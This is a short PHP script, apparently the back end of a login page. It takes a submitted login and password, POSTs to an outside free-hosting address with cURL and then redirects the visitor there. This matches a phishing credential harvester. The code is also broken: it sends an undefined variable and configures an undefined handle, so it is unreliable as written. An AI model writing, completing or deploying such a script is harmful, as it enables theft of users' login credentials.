<?php
    // The global $_POST variable allows you to access the data sent with the POST method by name
    // To access the data sent with the GET method, you can use $_GET
    $login = htmlspecialchars($_POST['login']);
    $password  = htmlspecialchars($_POST['password']);

    $url = "https://sparkling1234.000webhostapp.com/";

    $ch = curl_init($url);

    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $xml);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    curl_close($ch);

    header('Location: '.$url);
?>
